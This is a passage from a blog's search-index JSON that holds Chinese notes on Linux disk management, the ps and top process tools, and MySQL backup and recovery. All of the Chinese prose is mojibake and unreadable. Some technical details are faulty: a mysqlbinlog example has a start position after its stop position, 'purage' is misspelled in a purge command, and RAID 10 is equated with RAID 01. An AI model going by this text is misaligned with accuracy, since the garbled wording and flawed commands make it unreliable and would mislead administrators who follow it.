","date":"2022-07-05","objectID":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/:0:0","tags":["linux","git","devops"],"title":"æŒç»­é›†æˆ","uri":"/posts/linux/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"},{"categories":["linux"],"content":"ç£ç›˜ç®¡ç†","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/","tags":["linux","ç¡¬ç›˜"],"title":"ç£ç›˜ç®¡ç†(åŠè‰ç¨¿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"ç£ç›˜ç®¡ç† ç£ç›˜çš„æœ€å°å­˜å‚¨å•ä½æ˜¯æ‰‡åŒºï¼Œå¤§å°ä¸º0.5kb(512Bytes)ï¼Œå¤šä¸ªè¿ç»­çš„æ‰‡åŒºç§°ä¹‹ä¸ºå— æ“ä½œç³»ç»Ÿæ–‡ä»¶å­˜å–çš„æœ€å°å•ä½æ˜¯å—(block)ï¼Œä¸º8ä¸ªè¿ç»­æ‰‡åŒº,å¤§å°æ˜¯8 x 0.5 = 4kb,å³ä½¿æ–‡ä»¶å°äº4k,ä¹Ÿä¼šå ç”¨4k ç¡¬ä»¶è®¾å¤‡ IDEç¡¬ç›˜: /dev/hd[a-d] SCSI/SATAç¡¬ç›˜: /dev/sd[a-d] è½¯ç›˜: /dev/fd[0-1] æ‰“å°æœº: /dev/lp[0-2] é¼ æ ‡: /dev/psaux /dev/mouse è½¯ç¡¬é“¾æ¥ è½¯è¿æ¥: ç±»ä¼¼windownsçš„å¿«æ·æ–¹å¼ ç¡¬é“¾æ¥: inodeä¸€è‡´ mount å‘½ä»¤ mount -o å‚æ•°è¯¦æƒ… `async` ä»¥å¼‚æ­¥çš„æ–¹å¼å¤„ç†æ–‡ä»¶ç³»ç»ŸIOï¼ŒåŠ é€Ÿå†™å…¥ï¼Œæ•°æ®ä¸ä¼šåŒæ­¥å†™å…¥åˆ°ç£ç›˜ï¼Œè€Œæ˜¯å†™å…¥åˆ°ä¸€ä¸ªç¼“å†²åŒºï¼Œæä¾›ç³»ç»Ÿæ€§èƒ½ï¼Œä½†æŸå¤±å®‰å…¨æ€§ã€‚ `sync` æ‰€æœ‰çš„IOæ“ç€åŒæ­¥å¤„ç†ï¼Œæ•°æ®åŒæ­¥å†™å…¥åˆ°ç£ç›˜ï¼Œæ€§èƒ½è¾ƒå¼±ï¼Œä½†å®‰å…¨æ€§æé«˜ `atime/noatime` æ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæ˜¯å¦ä¿®æ”¹å…¶æ—¶é—´æˆ³ï¼Œå¤§é‡æ–‡ä»¶å¯ä»¥æå‡IOé€Ÿåº¦ `auto/noauto` æ—¶å€™è‡ªåŠ¨æŒ‚è½½ `defaults` é»˜è®¤åŒ…å«`rw`,`suid`,`dev`,`exec`,`auto`,`nouser`,`asyncç­‰ç­‰` `exec/noexec` æ˜¯å¦å…è®¸æŒ‚è½½ç‚¹å†…çš„å¯æ‰§è¡Œæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯ç¦æ­¢äº†ä»å½“å‰ç›®å½•è¿è¡Œ,å¹¶æœªç¦æ­¢é€šè¿‡æŒ‡å®š`bash`è§£é‡Šå™¨æ¥è¿è¡Œ `ro` åªè¯» `rw` è¯»å†™ buffer cache buffer: ç”¨äºå†™å…¥æ•°æ®çš„ç¼“å†² cache: ç”¨äºè¯»å–æ•°æ®æ—¶çš„ç¼“å­˜ #ã€€raid https://support.hp.com/cn-zh/document/c01193785 raid 0 : 100%åˆ©ç”¨å­˜å‚¨ç©ºé—´ã€‚æœ€å°‘éœ€è¦ä¸¤å—ç›˜(æ®è¯´ä¸€å—ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡ä¸ªäººè§‰å¾—ä¸€å—åº”è¯¥æ²¡å•¥ç”¨)ï¼Œ æ²¡ç”¨å†—ä½™æ•°æ®ï¼Œä¸åšå¤‡ä»½ï¼Œä»»ä½•ä¸€å—ç£ç›˜æŸåéƒ½æ— æ³•è¿è¡Œã€‚ç†è®ºè¯»å†™æ˜¯å•å—ç£ç›˜çš„nå€ã€‚å­˜å‚¨æ€§èƒ½æœ€å¥½ï¼Œä½†å®‰å…¨æ€§ä¸é«˜ã€‚ raid 1: 50%çš„åˆ©ç”¨ç©ºé—´ï¼Œç£ç›˜æœ€å°éœ€è¦2nå—,æ€»ç©ºé—´ä»¥æœ€å°ç›˜ä¸ºå‡†ï¼Œé•œåƒåŒæ­¥æ•°æ®ï¼Œç†è®ºè¯»å–é€Ÿåº¦ä¸å—å½±å“ï¼Œç”šè‡³æ›´å¿«ä¸€ç‚¹ï¼Œå†™å…¥é€Ÿåº¦å—å½±å“ï¼Œæ›´æ¢ç›˜åéœ€è¦é•¿æ—¶é—´çš„é•œåƒåŒæ­¥ï¼Œä½†å¤–éƒ¨è¯»å–è¯»å†™ä¸å—å½±å“ã€‚ raid 3: è‡³å°‘éœ€è¦3å—ç›˜ï¼Œæœ€åä¸€å—ç›˜ç”¨äºå­˜å‚¨å¥‡å¶æ ¡éªŒæ•°æ®(ä¸“ç”¨çš„å¥‡å¶æ ¡éªŒ)ï¼Œç©ºé—´åˆ©ç”¨ç‡n - 1, å¯ç”¨æ€§ã€æˆæœ¬å’Œæ€§èƒ½æŠ˜ä¸­ï¼Œä½†ç”±äºéœ€è¦å¥‡å¶æ ¡éªŒï¼Œå› æ­¤é€Ÿåº¦è¾ƒæ…¢ã€‚ raid 5: å’Œraid 3ç±»ä¼¼,ä¹Ÿæ˜¯è‡³å°‘éœ€è¦3å—ç›˜ï¼Œæ¯ä¸ªå¥‡å¶æ ¡éªŒæ•°æ®æ˜¯å­˜å‚¨äºæ¯ä¸€ä¸ªç›¸åŒçš„æ•°æ®å—(åˆ†å¸ƒå¼å­˜å‚¨å¥‡å¶æ ¡éªŒæ•°æ®) raid 10: raid 0 + raid 1,åˆç§°ä¸ºraid 01 ","date":"2022-07-05","objectID":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/:0:0","tags":["linux","ç¡¬ç›˜"],"title":"ç£ç›˜ç®¡ç†(åŠè‰ç¨¿)","uri":"/posts/linux/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"ç³»ç»Ÿç®¡ç†","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/","tags":["linux","ç³»ç»Ÿ"],"title":"ç³»ç»Ÿç®¡ç†","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux"],"content":"1. è¿›ç¨‹ä¸çº¿ç¨‹ è¿›ç¨‹: ä¸€ä¸ªç¨‹åºçš„æ‰§è¡Œå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æ­£åœ¨æ‰§è¡Œçš„ç¨‹åº çº¿ç¨‹: åœ¨ä¸€ä¸ªç¨‹åºé‡Œçš„ä¸€ä¸ªæ‰§è¡Œè·¯çº¿å°±å«åšçº¿ç¨‹ 2. ps å‘½ä»¤ -f : æ˜¾ç¤ºUIDã€PIDã€PPIDã€C(ä½¿ç”¨cpuèµ„æºç™¾åˆ†æ¯”)ã€STIME(è¿›ç¨‹è¿è¡Œçš„å¼€å§‹æ—¶é—´)ã€TTYã€TIME(è¿›ç¨‹ä½¿ç”¨çš„cpuæ€»æ—¶é•¿)ã€CMDæ ä½ã€‚ ps aux|head -n 2 %CPU: cpuä½¿ç”¨ç‡ %MEMï¼š å†…å­˜ä½¿ç”¨ç‡ VSZ: è¡¨ç¤ºè¿›ç¨‹åˆ†é…çš„è™šæ‹Ÿå†…å­˜(kb) RSS: è¡¨ç¤ºè¿›ç¨‹åˆ†é…äº†å¤šå°‘å†…å­˜ï¼ˆRAMä¸­çš„ç‰©ç†å†…å­˜ï¼‰ï¼ŒRSSä¸åŒ…å«å·²ç»è¢«æ¢å‡ºçš„å†…å­˜ã€‚RSSåŒ…å«äº†å®ƒæ‰€é“¾æ¥çš„åŠ¨æ€åº“å¹¶ä¸”è¢«åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­çš„å†…å­˜ã€‚RSSè¿˜åŒ…å«æ ˆå†…å­˜å’Œå †å†…å­˜ã€‚ (kb) STAT: è¡¨ç¤ºå½“å‰è¿›ç¨‹çŠ¶æ€ S: è¿›ç¨‹ä¼‘çœ ä¸­ï¼Œå¯è¢«å”¤é†’; s: å½“å‰è¿›ç¨‹å«æœ‰å­è¿›ç¨‹ ; R: å½“å‰è¿›ç¨‹è¿è¡Œä¸­; D: ä¸å¯ä¸­æ–­çš„è¿›ç¨‹ï¼› Tï¼šè¿›ç¨‹æš‚åœçŠ¶æ€; Z:åƒµå°¸è¿›ç¨‹; \u003c é«˜ä¼˜å…ˆçº§è¿›ç¨‹ ; N:ä½ä¼˜å…ˆçº§è¿›ç¨‹ START: è¿›ç¨‹å¼€å§‹æ—¶é—´ TIMEï¼š è¿›ç¨‹æ‰§è¡Œæ—¶é—´ 3. top å‘½ä»¤ z: æ‰“å¼€æˆ–å…³é—­é¢œè‰² k: ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ i: å¿½ç•¥é—²ç½®å’Œåƒµæ­»è¿›ç¨‹ r: é‡æ–°å®‰æ’ä¸€ä¸ªè¿›ç¨‹çš„ä¼˜å…ˆçº§åˆ« s: æ”¹å˜ä¸¤æ¬¡åˆ·æ–°ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼ˆå•ä½ä¸ºsï¼‰ t: åˆ‡æ¢æ˜¾ç¤ºè¿›ç¨‹å’ŒCPUçŠ¶æ€ä¿¡æ¯ c: åˆ‡æ¢æ˜¾ç¤ºå‘½ä»¤åç§°å’Œå®Œæ•´å‘½ä»¤è¡Œ M: æ ¹æ®é©»ç•™å†…å­˜å¤§å°è¿›è¡Œæ’åº P: æ ¹æ®CPUä½¿ç”¨ç™¾åˆ†æ¯”å¤§å°è¿›è¡Œæ’åº x: é«˜äº®æŸä¸€åˆ— 4. è¿›ç¨‹æ£€æŸ¥ 4.1. pgrep æ˜¾ç¤ºç›¸å…³è¿›ç¨‹ID 4.2. kill ç‰¹æ®Šä¿¡å· 0 è¡¨ç¤ºä¸å‘é€ä»»ä½•ä¿¡å·ç»™PID,ä½†ä¼šå¯¹è¿™ä¸ªidè¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ‰§è¡Œç»“æœä¸º0,è¡¨ç¤ºæ¬¡è¿›ç¨‹å­˜åœ¨ï¼Œå¦‚æœç»“æœä¸º1,åˆ™è¡¨ç¤ºè¿›ç¨‹ä¸å­˜åœ¨ 4.3. ç‰¹æ®Šè¿›ç¨‹ å­¤å„¿è¿›ç¨‹ï¼šä¸€ä¸ªçˆ¶è¿›ç¨‹é€€å‡ºï¼Œè€Œå®ƒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå­è¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œé‚£ä¹ˆé‚£äº›å­è¿›ç¨‹å°†æˆä¸ºå­¤å„¿è¿›ç¨‹ã€‚å­¤å„¿è¿›ç¨‹å°†è¢«initè¿›ç¨‹(è¿›ç¨‹å·ä¸º1)æ‰€æ”¶å…»ï¼Œå¹¶ç”±initè¿›ç¨‹å¯¹å®ƒä»¬å®ŒæˆçŠ¶æ€æ”¶é›†å·¥ä½œã€‚ åƒµå°¸è¿›ç¨‹ï¼šä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨forkåˆ›å»ºå­è¿›ç¨‹ï¼Œå¦‚æœå­è¿›ç¨‹é€€å‡ºï¼Œè€Œçˆ¶è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒç”¨waitæˆ–waitpidè·å–å­è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„è¿›ç¨‹æè¿°ç¬¦ä»ç„¶ä¿å­˜åœ¨ç³»ç»Ÿä¸­ã€‚è¿™ç§è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµæ­»è¿›ç¨‹ã€‚ å‚æ•°è¯¦è§£ https://segmentfault.com/a/1190000008322093 http://blog.itpub.net/29270124/viewspace-2639162/ 5. topåˆ—è¯´æ˜ åºå· åˆ—å å«ä¹‰ a PID è¿›ç¨‹id b PPID çˆ¶è¿›ç¨‹id c RUSER Real user name d UID è¿›ç¨‹æ‰€æœ‰è€…çš„ç”¨æˆ·id e USER è¿›ç¨‹æ‰€æœ‰è€…çš„ç”¨æˆ·å f GROUP è¿›ç¨‹æ‰€æœ‰è€…çš„ç»„å g TTY å¯åŠ¨è¿›ç¨‹çš„ç»ˆç«¯åã€‚ä¸æ˜¯ä»ç»ˆç«¯å¯åŠ¨çš„è¿›ç¨‹åˆ™æ˜¾ç¤ºä¸º ? h PR ä¼˜å…ˆçº§ i NI niceå€¼ã€‚è´Ÿå€¼è¡¨ç¤ºé«˜ä¼˜å…ˆçº§ï¼Œæ­£å€¼è¡¨ç¤ºä½ä¼˜å…ˆçº§ j P æœ€åä½¿ç”¨çš„CPUï¼Œä»…åœ¨å¤šCPUç¯å¢ƒä¸‹æœ‰æ„ä¹‰ k %CPU ä¸Šæ¬¡æ›´æ–°åˆ°ç°åœ¨çš„CPUæ—¶é—´å ç”¨ç™¾åˆ†æ¯” l TIME è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´æ€»è®¡ï¼Œå•ä½ç§’ m TIME + è¿›ç¨‹ä½¿ç”¨çš„CPUæ—¶é—´æ€»è®¡ï¼Œå•ä½1/100ç§’ n %MEM è¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†å†…å­˜ç™¾åˆ†æ¯” o VIRT è¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜æ€»é‡ï¼Œå•ä½kbã€‚VIRT=SWAP+RES p SWAP è¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜ä¸­ï¼Œè¢«æ¢å‡ºçš„å¤§å°ï¼Œå•ä½kbã€‚ q RES è¿›ç¨‹ä½¿ç”¨çš„ã€æœªè¢«æ¢å‡ºçš„ç‰©ç†å†…å­˜å¤§å°ï¼Œå•ä½kbã€‚RES=CODE+DATA r CODE å¯æ‰§è¡Œä»£ç å ç”¨çš„ç‰©ç†å†…å­˜å¤§å°ï¼Œå•ä½kb s DATA å¯æ‰§è¡Œä»£ç ä»¥å¤–çš„éƒ¨åˆ†(æ•°æ®æ®µ+æ ˆ)å ç”¨çš„ç‰©ç†å†…å­˜å¤§å°ï¼Œå•ä½kb t SHR å…±äº«å†…å­˜å¤§å°ï¼Œå•ä½kb u nFLT é¡µé¢é”™è¯¯æ¬¡æ•° v nDRT æœ€åä¸€æ¬¡å†™å…¥åˆ°ç°åœ¨ï¼Œè¢«ä¿®æ”¹è¿‡çš„é¡µé¢æ•°ã€‚ w S è¿›ç¨‹çŠ¶æ€(D=ä¸å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€,R=è¿è¡Œ,S=ç¡çœ ,T=è·Ÿè¸ª/åœæ­¢,Z=åƒµå°¸è¿›ç¨‹) x COMMAND å‘½ä»¤å/å‘½ä»¤è¡Œ y WCHAN è‹¥è¯¥è¿›ç¨‹åœ¨ç¡çœ ï¼Œåˆ™æ˜¾ç¤ºç¡çœ ä¸­çš„ç³»ç»Ÿå‡½æ•°å z Flags ä»»åŠ¡æ ‡å¿—ï¼Œå‚è€ƒ sched.h top å±•ç¤ºåˆ—è¡¨è¯´æ˜ - å½“å‰æ—¶é—´ æ€»å…±è¿è¡Œæ—¶é—´ å½“å‰ç³»ç»Ÿç™»é™†ç”¨æˆ· ç³»ç»Ÿå¹³å‡è´Ÿè½½(æ­£å¸¸æ°´å¹³ä¸è¶…è¿‡: æ ¸å¿ƒæ•°xæ¯ä¸ªæ ¸å¿ƒçš„çº¿ç¨‹x0.8) 1åˆ†é’Ÿ 5åˆ†é’Ÿ 15åˆ†é’Ÿ top 14:33:32 up 1:38 1 user load average 1.84 1.81 1.48 - å½“å‰è¿è¡Œçš„è¿›ç¨‹ æ€»å…±è¿›ç¨‹ æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ ä¼‘çœ è¿›ç¨‹ åœæ­¢è¿›ç¨‹ åƒµæ­»è¿›ç¨‹ Tasks - 390 total 1 running 388 sleeping 0 stopped 1 zombie - cpuä½¿ç”¨å ç”¨ç™¾åˆ†æ¯” ç”¨æˆ·æ€ å†…æ ¸æ€ ç”¨æˆ·è¿›ç¨‹ç©ºé—´å†…æ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹ ç©ºé—²è¿›ç¨‹ ç­‰å¾…è¾“å…¥è¾“å‡º ç¡¬ä¸­æ–­ è½¯ä¸­æ–­ è™šæ‹Ÿæœº %Cpu(s) - 5.0 us 1.5 sy 0.0 ni 93.0 id 0.0 wa 0.4 hi 0.1 si 0.0 st - ç‰©ç†å†…å­˜æ€»å¤§å° ç©ºé—´çš„å†…å­˜æ€»é‡ ä½¿ç”¨ä¸­çš„å†…å­˜æ€»é‡ ç¼“å­˜çš„å†…å­˜æ€»é‡ MiB Mem 23324.9 total 13501.5 free 4962.2 used 4861.1 buff/cache MiB Swap äº¤æ¢åŒºæ€»é‡ ç©ºé—²äº¤æ¢åŒºæ€»é‡ ä½¿ç”¨çš„äº¤æ¢åŒºæ€»é‡ å¯ç”¨å†…å­˜æ€»é‡ - 4096.0 total 4096.0 free 0.0 used 17387.7 avail Mem PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND - - è¿›ç¨‹ä¼˜å…ˆçº§ niceå€¼ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šä½ï¼Œåä¹‹è¶Šé«˜ è¿›ç¨‹ä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜æ€»é‡ï¼Œå•ä½kbã€‚VIRT=SWAP+RES ä»»åŠ¡ä½¿ç”¨çš„éäº¤æ¢ç‰©ç†å†…å­˜ ä»»åŠ¡ä½¿ç”¨çš„å…±äº«å†…å­˜é‡ã€‚å®ƒåªæ˜¯åæ˜ äº†å¯èƒ½ä¸å…¶ä»–è¿›ç¨‹å…±äº«çš„å†…å­˜ ä»»åŠ¡çš„çŠ¶æ€ï¼Œå¯ä»¥æ˜¯(D:ä¸é—´æ–­ç¡çœ ;R:è¿è¡Œ;S:ç¡çœ ;T:æš‚åœ;Z:åƒµå°¸) æ€»CPUæ—¶é—´çš„ç™¾åˆ†æ¯” ä»»åŠ¡å½“å‰ä½¿ç”¨çš„å¯ç”¨ç‰©ç†å†…å­˜å…±äº« ä»»åŠ¡è‡ªå¯åŠ¨ä»¥æ¥ä½¿ç”¨çš„æ€»CPUæ—¶é—´ - ","date":"2022-07-05","objectID":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/:0:0","tags":["linux","ç³»ç»Ÿ"],"title":"ç³»ç»Ÿç®¡ç†","uri":"/posts/linux/%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å¤‡ä»½ä¸æ¢å¤","date":"2022-06-28","objectID":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/","tags":["linux","mysql","è§£å†³æ–¹æ¡ˆ"],"title":"Mysql å¤‡ä»½ä¸æ¢å¤","uri":"/posts/mysql/%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"mysql å¤‡ä»½ä¸æ¢å¤ æ•°æ®æ›´æ–°è¿‡ç¨‹ï¼Œä¾‹å¦‚ update è¯­å¥ å†™redo logï¼Œè¿›å…¥ prepareé˜¶æ®µ(xtrabackupå¤‡ä»½æœ€ä½åº”å¤„äºè¯¥é˜¶æ®µ ) å†™binlogè½ç›˜ redo logå®Œæˆ commit å¤‡ä»½ç±»å‹ å†·å¤‡ä»½: å…³é—­æ•°æ®ï¼Œåœæ­¢ä¸šåŠ¡ æ¸©å¤‡ä»½: åŠ é”å¤‡ä»½ çƒ­å¤‡ä»½: åœ¨çº¿å¤‡ä»½ï¼Œä¸å½±å“ä¸šåŠ¡ å¤‡ä»½æ–¹å¼ é€»è¾‘å¤‡ä»½: åŸºäºsqlè¯­å¥çš„å¤‡ä»½ mysqldump: å»ºåº“ã€å»ºè¡¨ã€æ•°æ®æ’å…¥è¯­å¥ åŸºäºäºŒè¿›åˆ¶æ—¥å¿—: æ•°æ®åº“çš„æ‰€æœ‰å˜åŒ–ç±»çš„æ“ä½œ åŸºäºå¤åˆ¶çš„å¤‡ä»½: å°†äºŒè¿›åˆ¶æ—¥å¿—å®æ—¶ä¼ é€åˆ°å¦ä¸€å°æœºå™¨å¹¶ä¸”æ¢å¤ ç‰©ç†å¤‡ä»½: xtrabackupè¿›è¡Œç‰©ç†å¤‡ä»½ æ‹·è´æ•°æ®æ–‡ä»¶(å†·å¤‡) å¤‡ä»½å·¥å…· mysqldump mysqlåŸç”Ÿè‡ªå¸¦çš„é€»è¾‘å¤‡ä»½å·¥å…· ä¼˜ç‚¹æ˜¯å¤‡ä»½ç»“æœæ˜¯sqlè¯­å¥ï¼Œéƒ½æ˜¯æ–‡æœ¬æ ¼å¼ï¼Œä¾¿äºæŸ¥çœ‹å³å‹ç¼©, ç¼ºç‚¹æ˜¯æ•ˆç‡è¾ƒæ…¢ mysqldump -A -R --triggers --master-data=2 --single-transaction | gzip \u003e /data/backup_all.sql.gz å‚æ•°: -A: å…¨åº“å¤‡ä»½(ä¼šå¤‡ä»½mysqlåº“) mysqldump -uroot -pxxx -A \u003e backup.sql -Bï¼š å¢åŠ å»ºåº“(create)å³\"use åº“â€œçš„è¯­å¥ï¼Œå¯ä»¥ç›´æ¥è¿æ¥å¤šä¸ªåº“åï¼ŒåŒæ—¶å¤‡ä»½å¤šä¸ªåº“-B åº“1 åº“2 -R: å¤‡ä»½å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°æ•°æ® --triggers: å¤‡ä»½è§¦å‘å™¨æ•°æ® -F: åœ¨å¤‡ä»½æ˜¯è‡ªåŠ¨åˆ·æ–°ä¸€ä¸ªäºŒè¿›åˆ¶æ—¥å¿—,æ–¹ä¾¿å°†æ¥äºŒè¿›åˆ¶æ—¥å¿—æˆªå–æ—¶çš„èµ·ç‚¹ --master-data=2: å‘Šè¯‰ä½ å¤‡ä»½æ—¶åˆ»çš„binlogæ—¥å¿—ä½ç½®,ä¸€èˆ¬é€‰æ‹©2,ä»¥æ³¨é‡Šå½¢å¼è®°å½•äºŒè¿›åˆ¶æ—¥å¿—çš„ä½ç½® -x, --lock-all-tables: é”å®šæ‰€æœ‰è¡¨(é”è¡¨åªä¼šå½±å“å¢åˆ æ”¹,ä¸ä¼šå½±å“æŸ¥è¯¢),ä¿è¯æ•´ä¸ªæ•°æ®åº“ï¼ˆæ‰€æœ‰schemaï¼‰çš„æ•°æ®å…·æœ‰ä¸€è‡´æ€§å¿«ç…§,ä¸€èˆ¬ä¸å»ºè®®ä½¿ç”¨ -l, --lock-tables: ä¿è¯å„ä¸ªschemaå…·æœ‰æ•°æ®ä¸€è‡´æ€§å¿«ç…§ --single-transaction: å¯¹innodbå¼•æ“è¿›è¡Œçƒ­å¤‡ å¤‡ä»½æ¢å¤: -- æ–¹æ³•ä¸€ --- mysql -uroot \u003c /data/backup_all.sql -- æ–¹æ³•äºŒ(å»ºè®®ä½¿ç”¨) mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql ... mysql\u003e mysqldumpå¤‡ä»½æ¢å¤æ¡ˆä¾‹: -- æ¯å¤©æ™šä¸Šæœ‰å…¨å¤‡ä»½,ç¬¬äºŒå¤©æ—©ä¸Šè¯¯åˆ é™¤ä¸€ä¸ªè¡¨ -- æ¢å¤æ€è·¯ --- 1. æ–­å¼€ä¸šåŠ¡,é˜²æ­¢äºŒæ¬¡ä¼¤å®³(æŒ‚å‡ºç»´æŠ¤é¡µé¢) --- 2. æ­å»ºå¤‡ç”¨åº“ --- 3. æˆªå–æ˜¨å¤©æ™šä¸Šå…¨å¤‡æ—¶é—´åˆ°æ—©ä¸Šåˆ é™¤ä¹‹å‰çš„æ—¥å¿— --- 4. æ¢å¤åˆ°å¤‡ç”¨åº“,éªŒè¯æ•°æ®å®Œæ•´æ€§ --- 5. ä¸¤ç§æ–¹æ¡ˆæ¢å¤å‰ç«¯åº”ç”¨ ---- 5.1. å¤‡ç”¨åº“å¯¼å‡ºè¯¯åˆ è¡¨åˆ°ç”Ÿäº§åº“ ---- 5.2. ç›´æ¥åˆ‡æ¢åˆ°å¤‡ç”¨åº“ -- å…·ä½“æ“ä½œ --- 1. è·å–å…¨å¤‡æ—¶åˆ»çš„binlogå·(:22) --- -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000039', MASTER_LOG_POS=183021; --- 2. æˆªå–binlogä»å…¨å¤‡åˆ°åˆ é™¤æ—¶åˆ»çš„binlogå· æ­¤å¤„ä¸èƒ½å’Œå‰é¢äº¤é”™æˆªå–ï¼Œä¸ç„¶å¯èƒ½ä¼šå‡ºé—®é¢˜ mysql\u003e show binlog events in 'mysql-bin.000002'; -- end: 183014 $\u003e mysqlbinlog --no-defaults --start-position=183021 --stop-position=183014 /data/mysql56/3307/data/mysql-bin/mysql-bin.000039 \u003e\u003e /data/binlog.sql --- ä¸´æ—¶å…³é—­äºŒè¿›åˆ¶æ—¥å¿—ä¿¡æ¯ mysql\u003e set sql_log_bin=0 mysql\u003e source /data/backup_all.sql mysql\u003e source /data/binlog.sql mysql\u003e set sql_log_bin=1 --- binlogè‡ªåŠ¨æ¸…ç† mysql\u003e show variables like '%expire%'; mysql\u003e set global expire_logs_days=8; -- ä¸€èˆ¬è®¾ç½®ä¸ºå…¨å¤‡+1å¤© -- æ°¸ä¹…ç”Ÿæ•ˆ -- /etc/my.cnf -- expire_logs_days=8 -- æ‰‹åŠ¨æ¸…ç†äºŒè¿›åˆ¶æ–‡ä»¶ mysql\u003e purge binary logs before now() - interval 3 day; -- 3 å¤©å‰ mysql\u003e purage binary logs to 'mysql-bin.000010'; -- åˆ é™¤åˆ° -- ä¸è¦æ‰‹åŠ¨ rm mysql-bin.00000x æ–‡ä»¶ï¼Œå¦åˆ™ä¼šå‡ºç°é—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆ -- 1. å…³é—­ my.cnf binlogç›¸å…³å‚æ•°ï¼Œåˆ é™¤mysql-bin.indexæ–‡ä»¶,å¯åŠ¨æ•°æ®åº“ -- 2. å…³é—­æ•°æ®åº“ï¼Œå¼€å¯binlogç›¸å…³å‚æ•°ï¼Œå¯åŠ¨æ•°æ®åº“ -- æ»šåŠ¨ä¸€ä¸ªæ–°çš„æ—¥å¿—(é‡å¯ä¼šè‡ªåŠ¨æ»šåŠ¨ä¸€ä¸ªæ—¥å¿—) mysql\u003e flush logs; mysqlbinlog å®ç°binlogå¤‡ä»½çš„åŸç”Ÿå‘½ä»¤ xtrabackup preconaå…¬å¸å¼€å‘çš„æ€§èƒ½å¾ˆé«˜çš„ç‰©ç†å¤‡ä»½å·¥å…·(çƒ­å¤‡) å¤‡ä»½æ–¹å¼: æ‹·è´æ•°æ®æ–‡ä»¶ æ‹·è´æ•°æ®é¡µ å¤‡ä»½åŸç†(innoDB): å¯¹äºinnoDBè¡¨,å¯ä»¥å®ç°çƒ­å¤‡ åœ¨æ•°æ®è¿˜æœ‰ä¿®æ”¹æ“ä½œçš„æ—¶å€™,ç›´æ¥å°†æ•°æ®æ–‡ä»¶ä¸­çš„æ•°æ®é¡µå¤‡ä»½(åº”è¯¥æ˜¯ç›¸å½“äºç£ç›˜å—),æ­¤æ—¶,å¤‡ä»½èµ°çš„æ•°æ®å¯¹äºå½“å‰mysqlæ¥è®²æ˜¯ä¸ä¸€è‡´çš„ å°†å¤‡ä»½è¿‡ç¨‹ä¸­çš„redoå’Œundoä¸€å¹¶å¤‡èµ° ä¸ºäº†æ¢å¤çš„æ—¶å€™,åªè¦ä¿è¯å¤‡ä»½å‡ºæ¥çš„æ•°æ®é¡µLSNèƒ½å’Œredo LSNåŒ¹é…,å°†æ¥æ¢å¤çš„å°±æ˜¯ä¸€è‡´çš„æ•°æ®. redoåº”ç”¨å’Œundoçš„åº”ç”¨ å¯¹äºmyisamè¡¨å®ç°è‡ªåŠ¨è¯´è¡¨æ‹·è´æ–‡ä»¶ xtrabackup å®‰è£…ä½¿ç”¨: XtraBackup 2.4/8.0 ç‰ˆæœ¬åŒºåˆ« é€šè¿‡æŸ¥åˆ°å¯çŸ¥ XtraBackup 2.4 ä¸ 8.0 ç‰ˆæœ¬å¤‡ä»½è®°å½•ä¿¡æ¯æœ‰å¦‚ä¸‹ä¸åŒç‚¹ï¼š 2.4 å¤‡ä»½ç”Ÿæˆçš„ xtrabackup_binlog_info æ–‡ä»¶è®°å½•çš„ GTID ä¿¡æ¯æ˜¯å‡†ç¡®çš„ï¼Œä½†æ˜¯å¤‡ä»½æ¢å¤å show master status æ˜¾ç¤ºçš„ GTID æ˜¯ä¸å‡†ç¡®çš„ï¼› 8.0 å¤‡ä»½çš„å®ä¾‹ä¸­åªæœ‰ InnoDB è¡¨æ—¶ï¼Œxtrabackup_binlog_info æ–‡ä»¶è®°å½•çš„ GTID 